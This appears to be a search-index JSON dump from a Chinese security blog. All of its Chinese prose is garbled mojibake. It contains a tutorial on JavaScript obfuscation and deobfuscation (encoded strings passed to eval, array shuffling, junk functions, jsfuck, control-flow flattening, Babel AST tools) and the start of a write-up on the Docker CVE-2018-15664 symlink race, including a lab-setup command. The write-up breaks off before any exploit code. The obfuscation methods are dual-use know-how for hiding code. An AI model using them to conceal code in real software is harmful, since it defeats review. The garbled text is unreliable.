å¯†å¾—åˆ°å¯†æ–‡ï¼Œç„¶ååœ¨ä½¿ç”¨ä¹‹å‰ï¼Œè°ƒç”¨å¯¹åº”çš„è§£ç æˆ–è§£å¯†å‡½æ•°å»è§£å¯†ï¼Œå¾—åˆ°æ˜æ–‡ã€‚ JS ä¸­è‡ªå¸¦ Base64 ç¼–ç è§£ç çš„å‡½æ•°ï¼Œbtoa ç”¨æ¥ç¼–ç ï¼Œatob ç”¨æ¥è§£ç ã€‚ ä½†åœ¨å®é™…çš„æ··æ·†åº”ç”¨ä¸­ï¼Œæœ€å¥½è¿˜æ˜¯é‡‡ç”¨è‡ªå®šä¹‰å‡½æ•°çš„æ–¹å¼ï¼Œç„¶ååŠ ä»¥æ··æ·†ã€‚åœ¨è¿™é‡Œå°±ç”¨ atob æ¥ä»£æ›¿ Base64 è§£ç ï¼Œå¤„ç†åçš„ä»£ç ä¸ºï¼š Date.prototype.\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074 = function(formatStr) { var \\u0073\\u0074\\u0072 = \\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0053\\u0074\\u0072; var Week = ['\\u65e5', '\\u4e00', '\\u4e8c', '\\u4e09', '\\u56db', '\\u4e94', '\\u516d']; eval(String.fromCharCode(115, 116, 114, 32, 61, 32, 115, 116, 114, 91, 39, 114, 101, 112, 108, 97, 99, 101, 39, 93, 40, 47, 121, 121, 121, 121, 124, 89, 89, 89, 89, 47, 44, 32, 116, 104, 105, 115, 91, 39, 103, 101, 116, 70, 117, 108, 10","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/:1:2","tags":["ä»£ç å®¡è®¡","JavaScript"],"title":"JavaScript åæ··æ·†","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2 å¢åŠ é€†å‘å·¥ä½œé‡ ","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/:2:0","tags":["ä»£ç å®¡è®¡","JavaScript"],"title":"JavaScript åæ··æ·†","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2.1 æ•°ç»„æ··æ·† æŠŠä»£ç ä¸­æ‰€æœ‰çš„å­—ç¬¦ä¸²ï¼Œéƒ½æå–åˆ°ä¸€ä¸ªæ•°ç»„ä¸­ï¼Œç„¶åéœ€è¦å¼•ç”¨å­—ç¬¦ä¸²çš„åœ°æ–¹ï¼Œå…¨éƒ½ä»¥æ•°ç»„ä¸‹æ ‡çš„æ–¹å¼å»è®¿é—®æ•°ç»„æˆå‘˜ã€‚ var bigArr = ['Date', 'getTime', 'log']; console[bigArr[2]](new window[bigArr[0]]()[bigArr[1]]()); console[\"log\"](new window.Date().getTime()) var bigArr = [ '\\u65e5', '\\u4e00', '\\u4e8c', '\\u4e09', '\\u56db', '\\u4e94', '\\u516d', 'cmVwbGFjZQ==', 'Z2V0TW9udGg=', 'dG9TdHJpbmc=', 'Z2V0RGF0ZQ==', 'MA==', \"\"['constructor']['fromCharCode'] ]; Date.prototype.\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074 = function(formatStr) { var \\u0073\\u0074\\u0072 = \\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0053\\u0074\\u0072; var Week = [bigArr[0], bigArr[1], bigArr[2], bigArr[3], bigArr[4], bigArr[5], bigArr[6]]; eval(String.fromCharCode(115, 116, 114, 32, 61, 32, 115, 116, 114, 91, 39, 114, 101, 112, 108, 97, 99, 101, 39, 93, 40, 47, 121, 121, 121, 121, 124, 89, 89, 89, 89, 47, 44, 32, 116, 104, 105, 115, 91, 39, 103, 101, 116, 70, 117, 108, 108, 89, 101, 97, 114, 39, 93, 40, 41, 41, 59)); str = str[atob(bigArr[7])](/MM/, (this[atob(bigArr[8])]() + 1) \u003e 9 ? (this[atob(bigArr[8])]() + 1)[atob(bigArr[9])]() : atob(bigArr[11]) + (this[atob(bigArr[8])]() + 1)); str = str[atob(bigArr[7])](/dd|DD/, this[atob(bigArr[10])]() \u003e 9 ? this[atob(bigArr[10])]()[atob(bigArr[9])]() : atob(bigArr[11]) + this[atob(bigArr[10])]()); return str; } console.log( new \\u0077\\u0069\\u006e\\u0064\\u006f\\u0077['\\u0044\\u0061\\u0074\\u0065']()[bigArr[12](102, 111, 114, 109, 97, 116)]('\\x79\\x79\\x79\\x79\\x2d\\x4d\\x4d\\x2d\\x64\\x64') ); ","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/:2:1","tags":["ä»£ç å®¡è®¡","JavaScript"],"title":"JavaScript åæ··æ·†","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2.2 æ•°ç»„ä¹±åº å°†ä¸Šè¿°æå–å‡ºæ¥çš„æ•°ç»„é¡ºåºæ‰“ä¹±ï¼Œåœ¨å–å…ƒç´ æ—¶ï¼Œè¿›è¡Œè¿˜åŸã€‚ var bigArr = [ '\\u65e5', '\\u4e00', '\\u4e8c', '\\u4e09', '\\u56db', '\\u4e94', '\\u516d', 'cmVwbGFjZQ==', 'Z2V0TW9udGg=', 'dG9TdHJpbmc=', 'Z2V0RGF0ZQ==', 'MA==', \"\"['constructor']['fromCharCode'] ]; (function(arr, num){ var shuffer = function(nums){ while(--nums){ arr.unshift(arr.pop()); } }; shuffer(++num); }(bigArr, 0x20)); console.log( bigArr ); ","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/:2:2","tags":["ä»£ç å®¡è®¡","JavaScript"],"title":"JavaScript åæ··æ·†","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2.3 èŠ±æŒ‡ä»¤ ç»™ä»£ç æ·»åŠ ä¸€äº›æ²¡æœ‰æ„ä¹‰çš„ä»£ç ï¼Œæ˜¯èŠ±æŒ‡ä»¤çš„æ ¸å¿ƒã€‚ä¾‹å¦‚ï¼šæŠŠ this.getMonth() + 1 è¿™ä¸ªäºŒé¡¹å¼ç¨ä½œå˜åŠ¨ï¼š function _0x20ab1fxe1(a, b){ return a + b; } // _0x20ab1fxe1(this.getMonth(), 1); _0x20ab1fxe1(new Date().getMonth(), 1); //è¾“å‡º 11 è¿˜å¯ä»¥è¿›ä¸€æ­¥åµŒå¥—ï¼š function _0x20ab1fxe2(a, b){ return a + b; } function _0x20ab1fxe1(a, b){ return _0x20ab1fxe2(a, b); } _0x20ab1fxe1(new Date().getMonth(), 1); //è¾“å‡º 11 æ­¤å¤–ï¼Œä¸ºäº†è¿›ä¸€æ­¥å¢åŠ ä»£ç å¤æ‚åº¦ï¼Œå¯ä»¥å°†ç›¸åŒåŠŸèƒ½çš„ä»£ç æ”¾åˆ°ä¸åŒçš„å‡½æ•°å½“ä¸­ï¼š function _0x20ab1fxe2(a, b){ return a + b; } function _0x20ab1fxe1(a, b){ return _0x20ab1fxe2(a, b); } function _0x20ab1fxe3(a, b){ return a + b; } function _0x20ab1fxe4(a, b){ return _0x20ab1fxe3(a, b); } _0x20ab1fxe4('0', _0x20ab1fxe1(new Date().getMonth(), 1)); //è¾“å‡º \"11\" ","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/:2:3","tags":["ä»£ç å®¡è®¡","JavaScript"],"title":"JavaScript åæ··æ·†","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2.4 jsfuck jsfuck å¯ä»¥ç®—æ˜¯ä¸€ç§ç¼–ç ã€‚å®ƒèƒ½æŠŠ JS ä»£ç è½¬åŒ–æˆåªç”¨ 6 ä¸ªå­—ç¬¦å°±å¯ä»¥è¡¨ç¤ºçš„ä»£ç ï¼Œä¸”å®Œå…¨å¯ä»¥æ­£å¸¸æ‰§è¡Œã€‚ è¿™ 6 ä¸ªå­—ç¬¦åˆ†åˆ«æ˜¯ []()!+ã€‚è½¬æ¢ä¹‹åçš„ JS ä»£ç éš¾ä»¥é˜…è¯»ï¼Œå¯ä»¥ä½œä¸ºäº›ç®€å•çš„æ··æ·†æªæ–½ã€‚ åœ¨çº¿ç¼–ç çš„ç½‘ç«™ï¼šhttp://www.jsfuck.com ","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/:2:4","tags":["ä»£ç å®¡è®¡","JavaScript"],"title":"JavaScript åæ··æ·†","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3 ä»£ç æ‰§è¡Œæµç¨‹çš„é˜²æŠ¤åŸç† ","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/:3:0","tags":["ä»£ç å®¡è®¡","JavaScript"],"title":"JavaScript åæ··æ·†","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3.1 æµç¨‹å¹³å¦åŒ– ä»£ç æœ¬æ¥æ˜¯ä¾ç…§é€»è¾‘é¡ºåºæ‰§è¡Œçš„ï¼Œæ§åˆ¶æµå¹³å¦åŒ–æ˜¯æŠŠåŸæ¥çš„ä»£ç çš„åŸºæœ¬å—æ‹†åˆ†ã€‚ æŠŠæœ¬æ¥é¡ºåºæ‰§è¡Œçš„ä»£ç å—ç”¨ switch case æ‰“ä¹±åˆ†å‘ï¼Œç”¨åˆ†å‘å™¨å’Œä¸€ä¸ªå˜é‡ï¼ŒæŠŠåŸæœ¬ä»£ç çš„é€»è¾‘è¿æ¥èµ·æ¥ã€‚ å¦‚ä¸‹é¢è¿™æ®µä»£ç ï¼š function test1(){ var a = 1000; var b = a + 2000; var c = b + 3000; var d = c + 4000; var e = d + 5000; var f = e + 6000; return f; } console.log( test1() ); ç»è¿‡æµç¨‹å¹³å¦åŒ–ä¹‹åï¼Œå˜ä¸ºï¼š function test2(){ var arrStr = '7|5|1|3|2|4|6'.split('|'), i = 0; while (!![]) { switch(arrStr[i++]){ case '1': var c = b + 3000; continue; case '2': var e = d + 5000; continue; case '3': var d = c + 4000; continue; case '4': var f = e + 6000; continue; case '5': var b = a + 2000; continue; case '6': return f; continue; case '7': var a = 1000; continue; } break; } } console.log( test2() ); //è¾“å‡º 21000 ","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/:3:1","tags":["ä»£ç å®¡è®¡","JavaScript"],"title":"JavaScript åæ··æ·†","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3.2 é€—å·è¡¨è¾¾å¼æ··æ·† é€—å·è¡¨è¾¾å¼æ··æ·†ä¸»è¦çš„ä½œç”¨æ˜¯æŠŠå¤šä¸ªè¡¨è¾¾å¼æˆ–è¯­å¥è¿æ¥æˆä¸€ä¸ªå¤åˆè¯­å¥ã€‚ä¸Šä¸€èŠ‚çš„åŸå§‹ä»£ç ç­‰ä»·äºï¼š function test1(){ var a, b, c, d, e, f; return a = 1000, b = a + 2000, c = b + 3000, d = c + 4000, e = d + 5000, f = e + 6000, f } console.log( test1() ); //è¾“å‡º 21000 return è¯­å¥åé¢ï¼Œé€šå¸¸åªèƒ½è·Ÿä¸€ä¸ªè¡¨è¾¾å¼ï¼Œå®ƒä¼šè¿”å›è¿™ä¸ªè¡¨è¾¾å¼è®¡ç®—ä¹‹åçš„ç»“æœã€‚ä½†æ˜¯é€—å·è¿ç®—ç¬¦ï¼Œå¯ä»¥æŠŠå¤šä¸ªè¡¨è¾¾å¼ï¼Œè¿æ¥æˆä¸€ä¸ªå¤åˆè¯­å¥ã€‚ å› æ­¤ä¸Šè¿°ä»£ç ä¸­ï¼Œè¿™ä¹ˆä½¿ç”¨ return è¯­å¥ä¹Ÿæ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œä¼šè¿”å›æœ€åä¸€ä¸ªè¡¨è¾¾å¼è®¡ç®—ä¹‹åçš„ç»“æœï¼Œä½†æ˜¯å‰é¢çš„è¡¨è¾¾å¼ä¾ç„¶ä¼šæ‰§è¡Œã€‚ ä¸Šè¿°æ¡ˆä¾‹åªæ˜¯å•çº¯çš„è¿æ¥è¯­å¥ï¼Œè¿™ç§æ²¡æœ‰æ··æ·†åŠ›åº¦ï¼Œå†æ¥çœ‹ä¸€ä¸ªæ¡ˆä¾‹ï¼š function test2(){ var a, b, c, d, e, f; return f = (e = (d = (c = (b = (a = 1000, a + 2000), b + 3000), c + 4000), d + 5000), e + 6000); } console.log( test2() ); //è¾“å‡º 21000 æ­¤å¤–ï¼Œé€—å·è¡¨è¾¾å¼æ··æ·†è¿˜å¯ä»¥å¤„ç†è°ƒç”¨è¡¨è¾¾å¼ã€æˆå‘˜è¡¨è¾¾å¼ç­‰ã€‚æ¡ˆä¾‹å¦‚ä¸‹ï¼š var obj = { name: 'Geekby', add: function(a, b){ return a + b; } } function sub(a, b){ return a - b; } function test(){ var a = 1000; var b = sub(a,3000) + 1; var c = b + obj.add(b, 2000); return c + obj.name } test å‡½æ•°ä¸­æœ‰å‡½æ•°è°ƒç”¨è¡¨è¾¾å¼ sub()ï¼Œè¿˜æœ‰æˆå‘˜è¡¨è¾¾å¼ obj.add ç­‰ã€‚ å¯ä»¥è½¬æ¢æˆå¦‚ä¸‹å½¢å¼ï¼š var obj = { name: 'Geekby', add: function(a, b){ return a + b; } } function sub(a, b){ return a - b; } function test() { return c = (b = (a = 1000, sub)(a, 3000) + 1, b + (0, obj).add(b, 2000)), c + (0, obj).name; } ","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/:3:2","tags":["ä»£ç å®¡è®¡","JavaScript"],"title":"JavaScript åæ··æ·†","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["ä»£ç å®¡è®¡"],"content":"4 Babel çš„ API Javascript çš„è¯­æ³•æ˜¯éå¸¸çµæ´»çš„ï¼Œå¦‚æœç›´æ¥å¤„ç† JS ä»£ç æ¥åšæ··æ·†æˆ–è€…è¿˜åŸï¼Œé‚£æ— ç–‘æ˜¯å¾ˆéº»çƒ¦çš„ï¼Œè€Œä¸”å®¹æ˜“å‡ºé”™ã€‚ä½†æ˜¯æŠŠ JS ä»£ç è½¬æ¢æˆæŠ½è±¡è¯­æ³•æ ‘ä»¥åï¼Œä¸€åˆ‡å°±å˜å¾—ç®€å•äº†ã€‚ åœ¨ç¼–è¯‘åŸç†é‡Œï¼Œä»æºç åˆ°æœºå™¨ç çš„è¿‡ç¨‹ï¼Œä¸­é—´è¿˜éœ€è¦ç»è¿‡å¾ˆå¤šæ­¥éª¤ã€‚æ¯”å¦‚ï¼Œæºç é€šè¿‡è¯æ³•åˆ†æå™¨å˜ä¸º Tokenï¼Œå†é€šè¿‡è¯­æ³•åˆ†æå™¨å˜ä¸º ASTï¼Œå†é€šè¿‡è¯­ä¹‰åˆ†æå™¨ï¼Œå¾€ä¸‹ç¼–è¯‘ï¼Œæœ€åå˜æˆæœºå™¨ç ã€‚æ‰€ä»¥ï¼ŒAST å®é™…ä¸Šæ˜¯ä¸€ä¸ªæ¦‚å¿µæ€§çš„ä¸œè¥¿ï¼Œå½“å®ç°äº†è¯æ³•åˆ†æå™¨å’Œè¯­æ³•åˆ†æå™¨ï¼Œå°±èƒ½æŠŠä¸åŒçš„è¯­è¨€è§£ææˆ AST æŠŠ JS ä»£ç è½¬æ¢æˆ ASTï¼Œå¯ä»¥ä½¿ç”¨ç°æˆçš„è§£æåº“ã€‚å½“ä½¿ç”¨çš„è§£æåº“ä¸ä¸€æ ·çš„æ—¶å€™ï¼Œç”Ÿæˆçš„ AST ä¼šæœ‰æ‰€åŒºåˆ«ã€‚æœ¬æ–‡é‡‡ç”¨çš„æ˜¯ Babelï¼Œæ˜¯ä¸€ä¸ª nodejs åº“ã€‚åœ¨ç”¨ AST è‡ªåŠ¨åŒ–å¤„ç† JS ä»£ç å‰ï¼Œå…ˆå¯¹ç›¸å…³ API è¿›è¡Œé˜è¿°ã€‚ ","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/:4:0","tags":["ä»£ç å®¡è®¡","JavaScript"],"title":"JavaScript åæ··æ·†","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["ä»£ç å®¡è®¡"],"content":"4.1 AST çš„åŸºæœ¬ç»“æ„ JS ä»£ç è§£ææˆ AST ä»¥åï¼Œå…¶å®å°±ç›¸å½“äºæ˜¯ json æ•°æ®ã€‚ç»è¿‡ Babel è§£æä»¥åï¼Œé€šå¸¸æŠŠé‡Œ é¢çš„ä¸€äº›å…ƒç´ å«åšèŠ‚ç‚¹(Nodeï¼‰ï¼ŒåŒæ—¶ Babel ä¹Ÿæä¾›äº†å¾ˆå¤šæ–¹æ³•å»æ“ä½œè¿™äº›èŠ‚ç‚¹ã€‚ä»¥ä¸€ä¸ªæ¡ˆä¾‹æ¥è¯´æ˜ AST çš„åŸºæœ¬ç»“æ„ï¼Œä»£ç å¦‚ä¸‹ï¼š let obj = { name: 'Hello World', add: function (a, b) { return a + b + 1000; }, mul: function (a, b) { return a * b + 1000; }, }; Babel çš„åœ¨çº¿ç‰ˆæœ¬ï¼šhttps://astexplorer.net ","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/:4:1","tags":["ä»£ç å®¡è®¡","JavaScript"],"title":"JavaScript åæ··æ·†","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["ä»£ç å®¡è®¡"],"content":"4.2 Babel ä¸­çš„ç»„ä»¶ 4.2.1 parser ä¸ generator parser ç»„ä»¶ç”¨æ¥å°† JS ä»£ç è½¬æ¢æˆ ASTï¼Œgenerator ç”¨æ¥å°† AST è½¬æ¢æˆ JS ä»£ç ã€‚ ä½¿ç”¨ let ast = parser. parse(jscode); å³å¯å®Œæˆ JS ä»£ç è½¬æ¢åˆ° AST çš„è¿‡ç¨‹ã€‚è¿™æ—¶å€™ æŠŠ AST è¾“å‡ºæ¥ã€‚è¾“å‡ºå‰é€šå¸¸å…ˆä½¿ç”¨ JSON.stringify æŠŠå¯¹è±¡è½¬ json æ•°æ®ã€‚æ¯”å¦‚ï¼Œconsole.log (JSON. stringify(ast, null, 2))ã€‚å¦å¤–ï¼Œparser çš„ parse æ–¹æ³•ï¼Œå…¶å®æ˜¯æœ‰ç¬¬äºŒä¸ªåƒæ•°çš„ã€‚ let ast = parser.parse(jscode, { sourceType: \"module\", }); sourceType é»˜è®¤æ˜¯ scriptã€‚å½“è§£æçš„ JS ä»£ç ä¸­å«æœ‰ importã€export ç­‰å…³é”®å­—çš„æ—¶å€™ï¼Œéœ€è¦æŒ‡å®š sourceType ä¸º moduleã€‚ä¸ç„¶ä¼šæŠ¥é”™ï¼š SyntaxError: 'import' and 'export' may appear only with 'sourceType: \"module\"' (1:0) ä½¿ç”¨ let code = generator(ast).codeï¼Œå³å¯æŠŠ AST è½¬æ¢ä¸º JS ä»£ç ã€‚ generator è¿”å›çš„æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå…¶ä¸­çš„ code å±æ€§æ‰æ˜¯éœ€è¦çš„ä»£ç ã€‚åŒæ—¶ï¼Œgenerator çš„ç¬¬äºŒä¸ªå‚æ•°æ¥æ”¶ä¸€ä¸ªå¯¹è±¡ï¼Œå¯ä»¥è®¾ç½®ä¸€äº›é€‰é¡¹ï¼Œæ¥å½±å“è¾“å‡ºçš„ç»“æœã€‚å®Œæ•´çš„é€‰é¡¹ä»‹ç»ï¼Œå¯å‚è€ƒ Babel å®˜æ–¹æ–‡æ¡£ï¼šhttps://babeljs.io/docs/en/babel-generatorã€‚ å¦‚ï¼š // retainLinesï¼šè¡¨ç¤ºæ˜¯å¦ä½¿ç”¨ä¸æºä»£ç ç›¸åŒçš„è¡Œå·ï¼Œé»˜è®¤ä¸º false let code = generator(ast, {retainLines: false}); // commentsï¼šè¡¨ç¤ºæ˜¯å¦ä¿ç•™æ³¨é‡Šï¼Œé»˜è®¤ä¸º true let code = generator(ast, {comments: false}); // compact è¡¨ç¤ºæ˜¯å¦å‹ç¼©ä»£ç ï¼Œä¸å…¶ä½œç”¨ç›¸åŒçš„é€‰é¡¹è¿˜æœ‰ minifiedã€conciseï¼Œå‹ç¼©ç¨‹åº¦ä¸åŒ let code = generator(ast, {minified: true}); 4.2.2 traverse ä¸ visitor traverse ç»„ä»¶ç”¨æ¥éå† ASTã€‚traverse ä¸€èˆ¬éœ€è¦é…åˆ visitor ä½¿ç”¨ã€‚visitor æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œé‡Œé¢å¯ä»¥å®šä¹‰ä¸€äº›æ–¹æ³•ï¼Œç”¨æ¥è¿‡æ»¤èŠ‚ç‚¹ã€‚ä¸¾ä¾‹å¦‚ä¸‹ï¼š // éå† FunctionExpression èŠ‚ç‚¹ let visitor = {}; visitor.FunctionExpression = function(path){ console.log(\"visitor\"); }; traverse(ast, visitor); å¦å¤–ä¸€ç§éå†æ–¹å¼ï¼š const visitor = { FunctionExpression: { enter(path) { console.log(\"visitor enter\"); }, exit(path) { console.log(\"visitor exit\"); } } }; traverse(ast, visitor); æ­£ç¡®çš„é€‰æ‹©èŠ‚ç‚¹å¤„ç†æ—¶æœºï¼Œæœ‰åŠ©äºæé«˜ä»£ç æ•ˆç‡ã€‚traverse æ˜¯ä¸€ä¸ªæ·±åº¦ä¼˜å…ˆçš„éå†è¿‡ç¨‹ã€‚å› æ­¤ï¼Œå¦‚æœå­˜åœ¨çˆ¶å­èŠ‚ç‚¹ï¼Œé‚£ä¹ˆ enter çš„å¤„ç†æ—¶æœºæ˜¯å…ˆå¤„ç†çˆ¶èŠ‚ç‚¹ï¼Œå†å¤„ç†å­èŠ‚ç‚¹ã€‚è€Œ exit çš„å¤„ç†æ—¶æœºæ˜¯å…ˆå¤„ç†å­èŠ‚ç‚¹ï¼Œå†å¤„ç†çˆ¶èŠ‚ç‚¹ã€‚traverse é»˜è®¤å°±æ˜¯åœ¨ enter æ—¶å€™å¤„ç†ï¼Œå¦‚æœè¦åœ¨ exit æ—¶å€™å¤„ç†ï¼Œå¿…é¡»åœ¨ visitor ä¸­å†™æ˜ã€‚ 4.2.3 types è¯¥ç»„ä»¶ä¸»è¦ç”¨æ¥åˆ¤æ–­èŠ‚ç‚¹ç±»å‹ï¼Œç”Ÿæˆæ–°çš„èŠ‚ç‚¹ç­‰ã€‚åˆ¤æ–­èŠ‚ç‚¹ç±»å‹å¾ˆç®€å•ã€‚ traverse(ast, { enter(path) { if ( path.node.type === \"Identifier\" \u0026\u0026 path.node.name === \"n\" ){ path.node.name = \"x\"; } } }); æ„é€ èŠ‚ç‚¹ï¼š let obj = {}; obj.type = 'BinaryExpression'; obj.left = {type: 'NumericLiteral', value: 1000}; obj.operator = '/'; obj.right = {type: 'NumericLiteral', value: 2000}; let code = generator(obj).code; 4.2.4 path å¯¹è±¡ ","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/:4:2","tags":["ä»£ç å®¡è®¡","JavaScript"],"title":"JavaScript åæ··æ·†","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"å®¹å™¨åŸºç¡€è®¾æ–½çš„å®‰å…¨é£é™©åˆ†æ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/","tags":["äº‘åŸç”Ÿå®‰å…¨","docker"],"title":"å®¹å™¨å®‰å…¨","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"å®¹å™¨åŸºç¡€è®¾æ–½çš„å®‰å…¨é£é™©åˆ†æ åœ¨äº‘åŸç”Ÿç”Ÿæ€ä¸­å·²ç»æœ‰å¾ˆå¤šç§ä¸åŒçš„å®¹å™¨è¿è¡Œæ—¶å®ç°ï¼Œä½†è€ƒè™‘åˆ°ç¨³å®šæ€§å’Œä½¿ç”¨çš„å¹¿æ³›ç¨‹åº¦ï¼Œä¸‹é¢ä»ä»¥ docker ä¸ºä¾‹è¿›è¡Œåˆ†æã€‚ ä»å®¹å™¨é•œåƒã€æ´»åŠ¨å®¹å™¨ã€å®¹å™¨ç½‘ç»œã€å®¹å™¨ç®¡ç†æ¥å£ã€å®¿ä¸»æœºæ“ä½œç³»ç»Ÿå’Œè½¯ä»¶æ¼æ´ç­‰å…­æ–¹é¢æ¥åˆ†æå®¹å™¨åŸºç¡€è®¾æ–½å¯èƒ½å­˜åœ¨çš„é£é™©ã€‚ ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:0:0","tags":["äº‘åŸç”Ÿå®‰å…¨","docker"],"title":"å®¹å™¨å®‰å…¨","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"1 é’ˆå¯¹å®¹å™¨å¼€å‘æµ‹è¯•è¿‡ç¨‹ä¸­çš„æ”»å‡»æ¡ˆä¾‹ ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:1:0","tags":["äº‘åŸç”Ÿå®‰å…¨","docker"],"title":"å®¹å™¨å®‰å…¨","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"1.1 èƒŒæ™¯ docker cp å‘½ä»¤ docker cp å‘½ä»¤ç”¨äºåœ¨ Docker åˆ›å»ºçš„å®¹å™¨ä¸­ä¸å®¿ä¸»æœºæ–‡ä»¶ç³»ç»Ÿä¹‹é—´è¿›è¡Œæ–‡ä»¶æˆ–ç›®å½•å¤åˆ¶ã€‚ ç¬¦å·é“¾æ¥ ç¬¦å·é“¾æ¥ - è½¯è¿æ¥ã€‚ç±»ä¼¼äº windows ä¸Šçš„å¿«æ·æ–¹å¼ åœ¨ linux ä¸­åˆ›å»ºç¬¦å·é“¾æ¥ï¼š ln -s target_path link_path ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:1:1","tags":["äº‘åŸç”Ÿå®‰å…¨","docker"],"title":"å®¹å™¨å®‰å…¨","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"1.2 CVE-2018-15664 - ç¬¦å·é“¾æ¥æ›¿æ¢æ¼æ´ å½±å“ç‰ˆæœ¬ï¼šDocker åœ¨ 17.06.0-ceï½17.12.1-ce:rc2ï¼Œ18.01.0-ceï½18.06.1-ce:rc2 ç‰ˆæœ¬èŒƒå›´å†…å—è¯¥æ¼æ´å½±å“ 1.2.1 åŸç† æ¼æ´ poc å‚è€ƒä½œè€… Aleksa Sarai å…¬å¸ƒçš„ poc æ–‡ä»¶ï¼šhttps://seclists.org/oss-sec/2019/q2/131 CVE-2018-15664 å®é™…ä¸Šæ˜¯ä¸€ä¸ª TOCTOU(time-of-check to time-of-use) çš„é—®é¢˜ã€‚å½“ç”¨æˆ·æ‰§è¡Œ docker cp å‘½ä»¤åï¼ŒDocker å®ˆæŠ¤è¿›ç¨‹æ¥æ”¶åˆ°è¯·æ±‚ï¼Œä¼šå¯¹ç”¨æˆ·ç»™å‡ºçš„å¤åˆ¶è·¯å¾„è¿›è¡Œæ£€æŸ¥ã€‚å¦‚æœè·¯å¾„ä¸­æœ‰å®¹å™¨å†…éƒ¨çš„ç¬¦å·é“¾æ¥ï¼Œåˆ™ç°åœ¨å®¹å™¨å†…éƒ¨å°†å…¶è§£ææˆå¯¹åº”çš„è·¯å¾„å­—ç¬¦ä¸²ï¼Œç•™å¾…åç”¨ã€‚ å¦‚æœåœ¨ Docker å®ˆæŠ¤è¿›ç¨‹æ£€æŸ¥å¤åˆ¶è·¯å¾„æ—¶ï¼Œæ”»å‡»è€…åœ¨è¿™é‡Œå…ˆæ”¾ç½®ä¸€ä¸ªéç¬¦å·é“¾æ¥çš„çš„å¸¸è§„æ–‡ä»¶æˆ–ç›®å½•ï¼Œæ£€æŸ¥ç»“æŸåï¼Œæ”»å‡»è€…åœ¨ Docker å®ˆæŠ¤è¿›ç¨‹ä½¿ç”¨è·¯å¾„å‰å°†å…¶æ›¿æ¢ä¸ºä¸€ä¸ªç¬¦å·é“¾æ¥ï¼Œé‚£ä¹ˆè¿™ä¸ªç¬¦å·é“¾æ¥å°±ä¼šè¢«æ‰“å¼€æ—¶åœ¨å®¿ä¸»æœºä¸Šè§£æï¼Œä»è€Œå¯¼è‡´ç›®å½•ç©¿è¶Šã€‚ 1.2.2 æ¼æ´å¤ç° åˆ©ç”¨ metarget å¿«é€Ÿæ­å»º CVE-2018-15664 ç¯å¢ƒï¼š ./metarget cnv install cve-2018-15664 ä¸‹è½½å¹¶è§£å‹ PoC å…¶ä¸­ï¼Œ build 